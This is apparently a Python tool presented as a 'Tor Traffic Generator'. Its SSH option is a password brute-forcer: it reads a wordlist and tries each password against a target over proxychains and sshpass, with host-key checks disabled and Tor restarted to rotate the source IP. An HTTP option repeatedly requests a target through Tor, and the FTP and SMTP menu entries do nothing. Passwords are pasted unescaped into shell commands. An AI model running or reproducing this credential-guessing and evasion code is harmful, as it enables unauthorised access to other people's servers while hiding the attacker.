import os
import getpass
import time
import sys
import subprocess

enable_tor = False


def wccount(filename):
    out = subprocess.Popen(['wc', '-l', filename],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT
                           ).communicate()[0]
    return int(out.partition(b' ')[0])


def create_traffic_ssh():
    ip = input("Enter the IP: ")
    port = input("Enter the port: ")
    username = input("Enter the username: ")
    password = input("Enter the password file: ")
    try:
        f = open(password)
    except Exception as e:
        print(e)
        sys.exit(1)
    try:
        os.system('service tor restart')
        print('[*] Tor is ready!')
    except Exception as e:
        print(e)

    traffic_count = wccount(password)
    print("[*] Found " + traffic_count.__str__() + " passwords...")
    print("[*] It will take approximately " + (traffic_count * 5).__str__() + " seconds...")
    time.sleep(2)
    for line in f:
        if enable_tor:
            print("[*] Getting new tor IP.")
            os.system('service tor restart')
            time.sleep(1)
        cmd = "proxychains -q sshpass -p '" + line + "' ssh -o StrictHostKeyChecking=no " + username + "@" + ip + " 'pwd' || echo 'error'"
        result = subprocess.check_output(cmd, shell=True)

        temp = result.decode("utf-8")

        if not (temp.__contains__("error")):
            print("Login succesfull with user: " + username + " and password: " + line)
        else:
            print("Login failed with user: " + username + " and password: " + line)
        time.sleep(1)


def create_traffic_http():
    ip = input("Enter the IP: ")
    port = input("Enter the port: ")
    traffic_count = input("Enter the number of traffic: ")
    print("[*] Creating " + traffic_count.__str__() + " traffic...")
    #print("[*] It will take approximately " + (traffic_count * 3).__str__() + " seconds...")
    os.system('service tor restart')
    time.sleep(2)
    i = 0
    while i < int(traffic_count):
        if enable_tor:
            print("[*] Getting new tor IP.")
            os.system('service tor restart')
            time.sleep(1)
        cmd = f"proxychains -q curl http://{ip}:{port} || echo 'error'"
        result = subprocess.check_output(cmd, shell=True)
        temp = result.decode("utf-8")
        if not (temp.__contains__("error")):
            print("Traffic generated succesfully!")
        else:
            print("Traffic generation failed!")
        i = i + 1
    time.sleep(2)


def mainmenu():
    global enable_tor
    if getpass.getuser() != "root":
        print("[*] You need to be root to run this script!")
        sys.exit(1)

    #print("[*] Welcome to Tor Traffic Generator!")
    print("[1] SSH")
    print("[2] HTTP")
    print("[3] FTP")
    print("[4] SMTP")
    user_input = input("Enter the number of the protocol: ")
    while user_input != "1" and user_input != "2" and user_input != "3" and user_input != "4":
        user_input = input("Enter the number of the protocol: ")

    tor_input = input("Would you like to enable Random Tor IPs y|N: ")
    if tor_input.__contains__("y"):
        enable_tor = True
        print("[*] Random Tor is enabled.")
        print("[*] Tor will be reloaded every time creating new traffic..")
    else:
        print("[*] Random Tor is disabled.")
        enable_tor = False

    if user_input == "1":
        create_traffic_ssh()
    elif user_input == "2":
        create_traffic_http()


if __name__ == '__main__':
    mainmenu()
